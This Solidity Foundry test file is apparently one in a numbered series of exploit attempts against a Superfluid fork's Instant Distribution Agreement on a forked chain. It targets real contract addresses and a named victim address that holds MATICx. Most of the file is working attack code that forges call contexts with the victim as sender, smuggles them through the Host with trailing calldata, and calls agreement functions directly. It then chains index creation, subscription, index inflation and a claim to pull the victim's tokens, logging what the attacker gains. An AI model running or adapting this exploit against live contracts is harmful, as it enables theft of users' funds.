// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/// @title Attempt65: ABI Confusion via _replacePlaceholderCtx
/// @notice Tests whether the fork IDA's functions (createIndex, updateSubscription,
///         updateIndex) also lack authorizeTokenAccess - enabling ctx forgery attack.
///
/// Theory: If ALL IDA functions skip authorizeTokenAccess in the fork build,
///         then we can use trailing-bytes to inject a forged ctx with
///         msgSender=victim. Functions like createIndex/updateSubscription/updateIndex
///         derive publisher from context.msgSender, so we could create indexes
///         under any victim, add ourselves as subscribers, inflate the index,
///         and then claim the pending distribution.

interface ISuperfluid {
    function callAgreement(
        address agreementClass,
        bytes calldata callData,
        bytes calldata userData
    ) external returns (bytes memory);
}

interface IIDA {
    function claim(
        address token, address publisher, uint32 indexId,
        address subscriber, bytes calldata ctx
    ) external returns (bytes memory);

    function createIndex(
        address token, uint32 indexId, bytes calldata ctx
    ) external returns (bytes memory);

    function updateSubscription(
        address token, uint32 indexId, address subscriber,
        uint128 units, bytes calldata ctx
    ) external returns (bytes memory);

    function updateIndex(
        address token, uint32 indexId, uint128 indexValue,
        bytes calldata ctx
    ) external returns (bytes memory);

    function getIndex(
        address token, address publisher, uint32 indexId
    ) external view returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);

    function getSubscription(
        address token, address publisher, uint32 indexId, address subscriber
    ) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);

    function distribute(
        address token, uint32 indexId, uint256 amount, bytes calldata ctx
    ) external returns (bytes memory);
}

interface IMATICx {
    function balanceOf(address) external view returns (uint256);
    function realtimeBalanceOfNow(address) external view returns (int256, uint256, uint256);
    function upgradeByETH() external payable;
    function downgradeToETH(uint256) external;
    function getHost() external view returns (address);
    function totalSupply() external view returns (uint256);
}

/// @dev Builds Superfluid-format ctx
library CtxLib {
    function encodeCtx(
        uint8 appCallbackLevel,
        uint8 callType,
        uint256 timestamp,
        address msgSender,
        bytes4 agreementSelector,
        bytes memory userData,
        uint256 appCreditGranted,
        uint256 appCreditWantedDeprecated,
        int256 appCreditUsed,
        address appAddress,
        address appCreditToken
    ) internal pure returns (bytes memory) {
        uint256 callInfo = uint256(appCallbackLevel) | (uint256(callType) << 32);
        uint256 creditIO = uint256(uint128(appCreditGranted)) |
            (uint256(uint128(appCreditWantedDeprecated)) << 128);

        return abi.encode(
            abi.encode(callInfo, timestamp, msgSender, agreementSelector, userData),
            abi.encode(creditIO, appCreditUsed, appAddress, appCreditToken)
        );
    }
}

contract Receiver65 {
    receive() external payable {}
}

contract Attempt65_AbiConfusion is Test {
    address constant HOST = 0x3E14dC1b13c488a8d5D310918780c983bD5982E7;
    address constant IDA  = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    address constant MATICx = 0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3;
    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    // Use a known victim who has MATICx balance
    // REX Market (SuperApp with MATICx balance)
    address constant VICTIM = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;

    uint32 constant TEST_IDX = 999_111_222;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"), 27039967);
    }

    // =========================================================================
    // TEST 1: Check if createIndex via direct call (not through Host) works
    //         on the fork IDA without authorizeTokenAccess
    // =========================================================================
    function test_1_direct_createIndex_no_host() public {
        console.log("=== TEST 1: Direct createIndex call (bypassing Host) ===");

        // Build a fake ctx
        bytes memory fakeCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, ATTACKER,
            IIDA.createIndex.selector, "", 0, 0, 0, address(0), address(0)
        );

        vm.prank(ATTACKER);
        try IIDA(IDA).createIndex(MATICx, TEST_IDX, fakeCtx) returns (bytes memory) {
            console.log("[TEST 1] SUCCESS: createIndex worked without Host!");
            (bool exist,,,) = IIDA(IDA).getIndex(MATICx, ATTACKER, TEST_IDX);
            console.log("[TEST 1] Index exists under attacker:", exist);
        } catch Error(string memory reason) {
            console.log("[TEST 1] REVERTED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 1] REVERTED (raw), len:", raw.length);
            if (raw.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(raw, 32)) }
                console.logBytes4(sel);
            }
        }
    }

    // =========================================================================
    // TEST 2: createIndex through Host with trailing-bytes forged ctx
    //         where msgSender = VICTIM
    // =========================================================================
    function test_2_trailing_createIndex_forged_victim() public {
        console.log("=== TEST 2: Trailing-bytes createIndex (msgSender=victim) ===");

        vm.deal(ATTACKER, 1 ether);

        // Forge ctx with msgSender = VICTIM
        bytes memory forgedCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, VICTIM,
            IIDA.createIndex.selector, "", 0, 0, 0, address(0), address(0)
        );

        // Build createIndex calldata with forged ctx as the ctx param
        // createIndex(token, indexId, ctx)
        bytes memory innerCalldata = abi.encodeWithSelector(
            IIDA.createIndex.selector,
            MATICx,
            TEST_IDX,
            forgedCtx  // forged ctx in the ctx param slot
        );

        // Append placeholder for Host's _replacePlaceholderCtx
        // _replacePlaceholderCtx checks that the LAST 32 bytes of data are zero
        // abi.encode(new bytes(0)) = [offset=0x20][length=0x00]
        // The last 32 bytes = length=0 ✓
        bytes memory trailingCalldata = abi.encodePacked(
            innerCalldata,
            uint256(0x20),  // offset pointing forward
            uint256(0)      // length = 0 (this is what _replacePlaceholderCtx checks)
        );

        console.log("[build] innerCalldata len:", innerCalldata.length);
        console.log("[build] trailingCalldata len:", trailingCalldata.length);

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, trailingCalldata, "") returns (bytes memory) {
            console.log("[TEST 2] SUCCESS: createIndex with forged victim ctx!");

            // Check if index was created under VICTIM's address
            (bool existVictim,,,) = IIDA(IDA).getIndex(MATICx, VICTIM, TEST_IDX);
            console.log("[TEST 2] Index exists under VICTIM:", existVictim);

            // Check if index was created under ATTACKER's address
            (bool existAttacker,,,) = IIDA(IDA).getIndex(MATICx, ATTACKER, TEST_IDX);
            console.log("[TEST 2] Index exists under ATTACKER:", existAttacker);
        } catch Error(string memory reason) {
            console.log("[TEST 2] REVERTED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 2] REVERTED (raw), len:", raw.length);
            if (raw.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(raw, 32)) }
                console.logBytes4(sel);
            }
        }
    }

    // =========================================================================
    // TEST 3: Normal createIndex through Host (for comparison)
    // =========================================================================
    function test_3_normal_createIndex() public {
        console.log("=== TEST 3: Normal createIndex (baseline) ===");

        vm.deal(ATTACKER, 1 ether);

        bytes memory normalCalldata = abi.encodeWithSelector(
            IIDA.createIndex.selector,
            MATICx,
            TEST_IDX,
            new bytes(0)  // empty placeholder ctx
        );

        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, normalCalldata, "") returns (bytes memory) {
            console.log("[TEST 3] SUCCESS: normal createIndex");
            (bool exist,,,) = IIDA(IDA).getIndex(MATICx, ATTACKER, TEST_IDX);
            console.log("[TEST 3] Index under attacker:", exist);
        } catch Error(string memory reason) {
            console.log("[TEST 3] REVERTED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 3] REVERTED (raw), len:", raw.length);
        }
    }

    // =========================================================================
    // TEST 4: Full attack sequence - if createIndex forgery works:
    //   1. createIndex under victim (forged ctx)
    //   2. updateSubscription under victim (forged ctx, subscriber=attacker)
    //   3. updateIndex under victim (forged ctx, inflate value)
    //   4. claim (normal, collect pending distribution)
    // =========================================================================
    function test_4_full_ctx_forgery_attack() public {
        console.log("=== TEST 4: Full ctx forgery attack ===");

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);

        // Check victim's initial MATICx balance
        (int256 victimBal,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
        console.log("[init] victim realtime balance:", victimBal);
        uint256 victimBalOf = IMATICx(MATICx).balanceOf(VICTIM);
        console.log("[init] victim balanceOf:", victimBalOf);

        // Get some MATICx for ourselves
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();
        uint256 atkBal = IMATICx(MATICx).balanceOf(ATTACKER);
        console.log("[init] attacker MATICx:", atkBal);

        // ── Step 1: Try createIndex under VICTIM using trailing-bytes forgery ──
        {
            bytes memory forgedCtx = CtxLib.encodeCtx(
                0, 1, block.timestamp, VICTIM,
                IIDA.createIndex.selector, "", 0, 0, 0, address(0), address(0)
            );

            bytes memory inner = abi.encodeWithSelector(
                IIDA.createIndex.selector, MATICx, TEST_IDX, forgedCtx
            );
            bytes memory trailing = abi.encodePacked(inner, uint256(0x20), uint256(0));

            try ISuperfluid(HOST).callAgreement(IDA, trailing, "") {
                console.log("[step1] createIndex under victim: SUCCESS");
                (bool exist,,,) = IIDA(IDA).getIndex(MATICx, VICTIM, TEST_IDX);
                console.log("[step1] index exists under victim:", exist);
            } catch Error(string memory reason) {
                console.log("[step1] FAILED:", reason);
                console.log("[step1] createIndex forgery blocked. Trying alternative...");

                // Alternative: maybe the Host's real ctx overwrites everything.
                // Try createIndex normally under attacker instead.
                bytes memory normalInner = abi.encodeWithSelector(
                    IIDA.createIndex.selector, MATICx, TEST_IDX, new bytes(0)
                );
                ISuperfluid(HOST).callAgreement(IDA, normalInner, "");
                console.log("[step1-alt] Normal createIndex under attacker: SUCCESS");
                return; // Can't do full attack if forgery doesn't work
            } catch {
                console.log("[step1] FAILED (unknown error)");
                return;
            }
        }

        // ── Step 2: updateSubscription under VICTIM (add ATTACKER as subscriber) ──
        {
            bytes memory forgedCtx = CtxLib.encodeCtx(
                0, 1, block.timestamp, VICTIM,
                IIDA.updateSubscription.selector, "", 0, 0, 0, address(0), address(0)
            );

            bytes memory inner = abi.encodeWithSelector(
                IIDA.updateSubscription.selector,
                MATICx, TEST_IDX, ATTACKER, uint128(1), forgedCtx
            );
            bytes memory trailing = abi.encodePacked(inner, uint256(0x20), uint256(0));

            try ISuperfluid(HOST).callAgreement(IDA, trailing, "") {
                console.log("[step2] updateSubscription (victim->attacker): SUCCESS");
                (bool exist, bool approved, uint128 units,) = IIDA(IDA).getSubscription(
                    MATICx, VICTIM, TEST_IDX, ATTACKER
                );
                console.log("[step2] sub exists:", exist);
                console.log("[step2] sub approved:", approved);
                console.log("[step2] sub units:", units);
            } catch Error(string memory reason) {
                console.log("[step2] FAILED:", reason);
                return;
            } catch {
                console.log("[step2] FAILED (unknown)");
                return;
            }
        }

        // ── Step 3: updateIndex under VICTIM (inflate index value) ──
        {
            // Set index value to a large number to create large pending distribution
            uint128 inflatedValue = uint128(1 ether); // 1e18 units * 1 unit = 1e18 wei pending

            bytes memory forgedCtx = CtxLib.encodeCtx(
                0, 1, block.timestamp, VICTIM,
                IIDA.updateIndex.selector, "", 0, 0, 0, address(0), address(0)
            );

            bytes memory inner = abi.encodeWithSelector(
                IIDA.updateIndex.selector,
                MATICx, TEST_IDX, inflatedValue, forgedCtx
            );
            bytes memory trailing = abi.encodePacked(inner, uint256(0x20), uint256(0));

            try ISuperfluid(HOST).callAgreement(IDA, trailing, "") {
                console.log("[step3] updateIndex (inflate under victim): SUCCESS");
                (bool exist, uint128 idxVal, uint128 approved, uint128 pending) = IIDA(IDA).getIndex(
                    MATICx, VICTIM, TEST_IDX
                );
                console.log("[step3] index exists:", exist);
                console.log("[step3] indexValue:", idxVal);
                console.log("[step3] totalUnitsApproved:", approved);
                console.log("[step3] totalUnitsPending:", pending);

                // Check pending distribution for attacker
                (,, uint128 units, uint256 pendingDist) = IIDA(IDA).getSubscription(
                    MATICx, VICTIM, TEST_IDX, ATTACKER
                );
                console.log("[step3] attacker pending distribution:", pendingDist);
            } catch Error(string memory reason) {
                console.log("[step3] FAILED:", reason);
                return;
            } catch {
                console.log("[step3] FAILED (unknown)");
                return;
            }
        }

        // ── Step 4: claim (normal, as attacker collecting pending distribution) ──
        {
            // Record balances before
            (int256 atkBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
            (int256 victimBefore,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
            console.log("[step4] attacker rt balance before:", atkBefore);
            console.log("[step4] victim rt balance before:", victimBefore);

            bytes memory claimCalldata = abi.encodeWithSelector(
                IIDA.claim.selector,
                MATICx, VICTIM, TEST_IDX, ATTACKER, new bytes(0)
            );

            try ISuperfluid(HOST).callAgreement(IDA, claimCalldata, "") {
                console.log("[step4] CLAIM SUCCESS!");
                (int256 atkAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(ATTACKER);
                (int256 victimAfter,,) = IMATICx(MATICx).realtimeBalanceOfNow(VICTIM);
                console.log("[step4] attacker rt balance after:", atkAfter);
                console.log("[step4] victim rt balance after:", victimAfter);
                console.log("[step4] attacker gained:", atkAfter - atkBefore);
                console.log("[step4] victim lost:", victimBefore - victimAfter);
            } catch Error(string memory reason) {
                console.log("[step4] FAILED:", reason);
            } catch {
                console.log("[step4] FAILED (unknown)");
            }
        }

        vm.stopPrank();
    }

    // =========================================================================
    // TEST 5: Analyze _replacePlaceholderCtx behavior with raw calldata
    //         Does the Host properly handle trailing bytes?
    // =========================================================================
    function test_5_replacePlaceholderCtx_behavior() public {
        console.log("=== TEST 5: _replacePlaceholderCtx behavior analysis ===");

        vm.deal(ATTACKER, 1 ether);
        vm.prank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 0.1 ether}();

        // Standard ABI encoding of createIndex(MATICx, TEST_IDX, new bytes(0)):
        // selector (4 bytes)
        // token (32 bytes)
        // indexId (32 bytes)
        // offset to ctx (32 bytes) -> points to ctx data
        // ctx length (32 bytes) = 0
        bytes memory standardCalldata = abi.encodeWithSelector(
            IIDA.createIndex.selector, MATICx, TEST_IDX, new bytes(0)
        );
        console.log("[std] standard calldata length:", standardCalldata.length);
        console.log("[std] calldata hex:");
        console.logBytes(standardCalldata);

        // Now with forged ctx embedded:
        bytes memory forgedCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, VICTIM,
            IIDA.createIndex.selector, "", 0, 0, 0, address(0), address(0)
        );
        console.log("[forged] ctx length:", forgedCtx.length);

        bytes memory embeddedCalldata = abi.encodeWithSelector(
            IIDA.createIndex.selector, MATICx, TEST_IDX, forgedCtx
        );
        console.log("[embedded] calldata with forged ctx length:", embeddedCalldata.length);

        // With trailing zero placeholder:
        bytes memory trailingCalldata = abi.encodePacked(
            embeddedCalldata,
            uint256(0x20),
            uint256(0)
        );
        console.log("[trailing] calldata with placeholder length:", trailingCalldata.length);
        console.log("[trailing] last 64 bytes:");
        console.logBytes(_slice(trailingCalldata, trailingCalldata.length - 64, 64));

        // What _replacePlaceholderCtx does:
        // 1. dataLen = data.length
        // 2. Reads mload(add(data, dataLen)) = last 32 bytes
        //    For our trailing calldata, last 32 bytes = 0x00 (the zero length) ✓
        // 3. Removes last 32 bytes: mstore(data, sub(dataLen, 0x20))
        //    New length = trailingCalldata.length - 32
        //    This removes the zero-length word, leaving: embeddedCalldata + offset(0x20)
        // 4. Appends: uint256(ctx.length) + ctx + padding
        //    Final: embeddedCalldata + offset(0x20) + realCtxLength + realCtx + padding
        //
        // The IDA then receives this calldata. ABI decoder for createIndex(token, indexId, ctx):
        // - token: at offset 4 = MATICx ✓
        // - indexId: at offset 36 = TEST_IDX ✓
        // - ctx: offset pointer at position 68 points to the FORGED ctx data
        // The trailing real ctx is just extra bytes that ABI decoder ignores!

        // Execute to see what actually happens
        vm.prank(ATTACKER);
        try ISuperfluid(HOST).callAgreement(IDA, trailingCalldata, "") returns (bytes memory ret) {
            console.log("[TEST 5] TRAILING CALLDATA SUCCEEDED!");
            console.log("[TEST 5] return data length:", ret.length);

            // Check which address the index was created under
            (bool existVictim,,,) = IIDA(IDA).getIndex(MATICx, VICTIM, TEST_IDX);
            (bool existAttacker,,,) = IIDA(IDA).getIndex(MATICx, ATTACKER, TEST_IDX);
            console.log("[TEST 5] Index under VICTIM:", existVictim);
            console.log("[TEST 5] Index under ATTACKER:", existAttacker);

            if (existVictim && !existAttacker) {
                console.log("*** CRITICAL: Index created under VICTIM! ctx forgery works! ***");
            } else if (existAttacker && !existVictim) {
                console.log("*** Host's real ctx overrode forged ctx (expected behavior) ***");
            } else if (existVictim && existAttacker) {
                console.log("*** Both exist - unexpected ***");
            }
        } catch Error(string memory reason) {
            console.log("[TEST 5] REVERTED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 5] REVERTED (raw), len:", raw.length);
            if (raw.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(raw, 32)) }
                console.logBytes4(sel);
            }
            if (raw.length > 0 && raw.length <= 256) {
                console.logBytes(raw);
            }
        }
    }

    // =========================================================================
    // TEST 6: What if we DON'T go through the Host at all?
    //         Call IDA.createIndex directly with a fake ctx
    //         If createIndex also lacks authorizeTokenAccess, this would work
    // =========================================================================
    function test_6_direct_ida_call_all_functions() public {
        console.log("=== TEST 6: Direct IDA calls (bypass Host entirely) ===");

        vm.deal(ATTACKER, 10 ether);
        vm.startPrank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();

        // Check: what does token.getHost() return?
        address host = IMATICx(MATICx).getHost();
        console.log("[info] MATICx host:", host);
        console.log("[info] IDA address:", IDA);

        // If authorizeTokenAccess is present, it checks:
        //   require(token.getHost() == msg.sender, "unauthorized host");
        // msg.sender when calling IDA directly = ATTACKER, not HOST
        // So this would fail IF authorizeTokenAccess exists

        bytes memory fakeCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, VICTIM,
            IIDA.createIndex.selector, "", 0, 0, 0, address(0), address(0)
        );

        // Test createIndex
        try IIDA(IDA).createIndex(MATICx, TEST_IDX, fakeCtx) {
            console.log("[TEST 6a] createIndex DIRECT: SUCCESS!");
            console.log("  => createIndex LACKS authorizeTokenAccess!");

            (bool exist,,,) = IIDA(IDA).getIndex(MATICx, VICTIM, TEST_IDX);
            console.log("  => Index under VICTIM:", exist);
            (bool exist2,,,) = IIDA(IDA).getIndex(MATICx, ATTACKER, TEST_IDX);
            console.log("  => Index under ATTACKER:", exist2);
        } catch Error(string memory reason) {
            console.log("[TEST 6a] createIndex DIRECT: FAILED:", reason);
            if (keccak256(bytes(reason)) == keccak256("unauthorized host")) {
                console.log("  => createIndex HAS authorizeTokenAccess");
            }
        } catch (bytes memory raw) {
            console.log("[TEST 6a] createIndex DIRECT: FAILED (raw), len:", raw.length);
            if (raw.length >= 4) {
                bytes4 sel;
                assembly { sel := mload(add(raw, 32)) }
                console.logBytes4(sel);
            }
        }

        // Test updateSubscription
        try IIDA(IDA).updateSubscription(MATICx, TEST_IDX, ATTACKER, uint128(1), fakeCtx) {
            console.log("[TEST 6b] updateSubscription DIRECT: SUCCESS!");
        } catch Error(string memory reason) {
            console.log("[TEST 6b] updateSubscription DIRECT: FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 6b] updateSubscription DIRECT: FAILED (raw), len:", raw.length);
        }

        // Test updateIndex
        try IIDA(IDA).updateIndex(MATICx, TEST_IDX, uint128(1e18), fakeCtx) {
            console.log("[TEST 6c] updateIndex DIRECT: SUCCESS!");
        } catch Error(string memory reason) {
            console.log("[TEST 6c] updateIndex DIRECT: FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 6c] updateIndex DIRECT: FAILED (raw), len:", raw.length);
        }

        // Test distribute
        try IIDA(IDA).distribute(MATICx, TEST_IDX, 1e18, fakeCtx) {
            console.log("[TEST 6d] distribute DIRECT: SUCCESS!");
        } catch Error(string memory reason) {
            console.log("[TEST 6d] distribute DIRECT: FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 6d] distribute DIRECT: FAILED (raw), len:", raw.length);
        }

        // Test claim (we know this one lacks authorizeTokenAccess)
        try IIDA(IDA).claim(MATICx, ATTACKER, TEST_IDX, ATTACKER, fakeCtx) {
            console.log("[TEST 6e] claim DIRECT: SUCCESS!");
        } catch Error(string memory reason) {
            console.log("[TEST 6e] claim DIRECT: FAILED:", reason);
        } catch (bytes memory raw) {
            console.log("[TEST 6e] claim DIRECT: FAILED (raw), len:", raw.length);
        }

        vm.stopPrank();
    }

    // =========================================================================
    // TEST 7: Alternative approach - what if the ctx's msgSender is used by
    //         the IDA but the IDA just trusts whatever ctx is passed in?
    //         Use callAgreement normally but with special userData that encodes
    //         a different msgSender... no, that doesn't change ctx.
    //         Actually: what about calling IDA directly FROM the Host address
    //         using vm.prank? This simulates what the Host does.
    // =========================================================================
    function test_7_prank_as_host() public {
        console.log("=== TEST 7: Call IDA as Host (vm.prank) ===");

        vm.deal(ATTACKER, 10 ether);
        vm.prank(ATTACKER);
        IMATICx(MATICx).upgradeByETH{value: 1 ether}();

        // Build ctx that looks like it came from the Host, with msgSender=VICTIM
        bytes memory forgedCtx = CtxLib.encodeCtx(
            0, 1, block.timestamp, VICTIM,
            IIDA.createIndex.selector, "", 0, 0, 0, address(0), address(0)
        );

        // Call createIndex AS the Host
        vm.prank(HOST);
        try IIDA(IDA).createIndex(MATICx, TEST_IDX, forgedCtx) {
            console.log("[TEST 7a] createIndex as HOST: SUCCESS");
            (bool existV,,,) = IIDA(IDA).getIndex(MATICx, VICTIM, TEST_IDX);
            console.log("  => Index under VICTIM:", existV);
        } catch Error(string memory reason) {
            console.log("[TEST 7a] FAILED:", reason);
        } catch {
            console.log("[TEST 7a] FAILED (unknown)");
        }

        // If authorizeTokenAccess IS present but we're calling from HOST,
        // the check token.getHost() == msg.sender passes.
        // Then it checks isCtxValid(ctx) - our forged ctx hash won't match _ctxStamp.
        // So this should fail at the ctx validation step.
        // UNLESS the function doesn't call authorizeTokenAccess at all!
    }

    // =========================================================================
    // TEST 8: Comprehensive bytecode analysis - check if the fork IDA has
    //         the authorizeTokenAccess call pattern in each function
    // =========================================================================
    function test_8_check_bytecode_patterns() public {
        console.log("=== TEST 8: Bytecode pattern check ===");

        // Get the IDA implementation bytecode
        bytes memory code = address(0x848497975f5757Aa1a48e13bbF46D330E62b19A7).code;
        console.log("[TEST 8] IDA impl bytecode length:", code.length);

        // The selector for getHost() is 0xe3e3df4e
        // authorizeTokenAccess pattern involves:
        // 1. STATICCALL to token.getHost()
        // 2. Compare result with msg.sender (CALLER opcode)
        // If the function lacks authorizeTokenAccess, the CALLER opcode shouldn't
        // appear in its execution path

        // For now, just log the bytecode length for reference
        // The real test is the direct call tests above
    }

    function _slice(bytes memory data, uint256 start, uint256 len) internal pure returns (bytes memory) {
        bytes memory result = new bytes(len);
        for (uint256 i = 0; i < len && (start + i) < data.length; i++) {
            result[i] = data[start + i];
        }
        return result;
    }
}
